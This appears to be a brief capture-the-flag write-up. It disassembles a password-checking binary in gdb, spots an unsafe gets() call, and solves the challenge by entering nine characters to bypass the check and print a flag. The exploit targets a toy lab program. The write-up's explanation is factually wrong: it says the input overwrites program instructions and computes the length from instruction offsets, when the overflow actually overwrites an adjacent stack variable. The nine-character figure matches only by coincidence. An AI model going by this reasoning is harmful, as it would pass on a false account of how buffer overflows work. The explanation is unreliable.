(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400577 <+0>:	push   %rbp
   0x0000000000400578 <+1>:	mov    %rsp,%rbp
   0x000000000040057b <+4>:	sub    $0x10,%rsp
   0x000000000040057f <+8>:	movl   $0x0,-0x4(%rbp)
   0x0000000000400586 <+15>:	lea    0xdb(%rip),%rdi        # 0x400668
   0x000000000040058d <+22>:	call   0x400460 <puts@plt>
   0x0000000000400592 <+27>:	lea    -0xc(%rbp),%rax
   0x0000000000400596 <+31>:	mov    %rax,%rdi
   0x0000000000400599 <+34>:	mov    $0x0,%eax
   0x000000000040059e <+39>:	call   0x400480 <gets@plt>           //calls for UserInput
   0x00000000004005a3 <+44>:	cmpl   $0x0,-0x4(%rbp)
   0x00000000004005a7 <+48>:	je     0x4005b7 <main+64>
   0x00000000004005a9 <+50>:	lea    0xd0(%rip),%rdi        # 0x400680
   0x00000000004005b0 <+57>:	call   0x400460 <puts@plt>             //Something is outputted, maybe the flag
   0x00000000004005b5 <+62>:	jmp    0x4005cd <main+86>
   0x00000000004005b7 <+64>:	mov    -0x4(%rbp),%eax
   0x00000000004005ba <+67>:	mov    %eax,%esi
   0x00000000004005bc <+69>:	lea    0xe7(%rip),%rdi        # 0x4006aa
   0x00000000004005c3 <+76>:	mov    $0x0,%eax
   0x00000000004005c8 <+81>:	call   0x400470 <printf@plt>
   0x00000000004005cd <+86>:	mov    $0x0,%eax
   0x00000000004005d2 <+91>:	leave
   0x00000000004005d3 <+92>:	ret
End of assembler dump.

We can try to do an Buffer Overflow Attack

0x000000000040059e <+39>:	call   0x400480 <gets@plt>           //calls for UserInput
   0x00000000004005a3 <+44>:	cmpl   $0x0,-0x4(%rbp)
   0x00000000004005a7 <+48>:	je     0x4005b7 <main+64>           //we need to "jump" over this instruction, to obtain access to the call   0x400460 <puts@plt>
   ...
   0x00000000004005b0 <+57>:    call   0x400460 <puts@plt>
   
   
 To do that, we need to "inject" some number of chr to overwrite the instructions between [call   0x400480 <gets@plt>] & [je     0x4005b7 <main+64>] == Skip the jump to Wrong PAssword
 
 In this case, the call to gets (UserInput asked) is at Offest +39, and the je instruction is at +48. To overwrite the JumpEqual Instruction, we need to have 9 chr in input
 48-39 = 9
 or 
 |39-48|
 
 
 /no_rop 

 Enter the password : 
123456789
Correct password! 
Flag={hello_world_pwn}

 
 






